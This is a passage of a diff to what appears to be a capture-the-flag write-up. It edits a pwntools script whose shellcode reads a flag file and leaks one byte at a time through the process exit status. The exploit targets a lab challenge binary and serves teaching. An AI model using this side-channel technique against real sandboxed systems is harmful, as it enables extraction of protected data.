@@ -70,18 +70,15 @@ However, the `exit` syscall takes an integer argument (the exit status), which i
 ```python
 from pwn import *
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
 def get_byte(index):
-    p = process([exe, "/flag"], level='error')
+    p = process([elf.path, "/flag"], level='error')
 
     # 1. read(3, 0x1337800, 100)
     sc = shellcraft.read(3, 0x1337800, 100)
 
     # 2. Extract byte at index and move to rdi for exit()
-    # Shellcraft doesn't have a direct "exit with byte from memory" helper,
-    # so we use a small assembly bridge.
     sc += f"movzx rdi, byte ptr [0x1337800 + {index}]"
 
     # 3. exit(rdi)
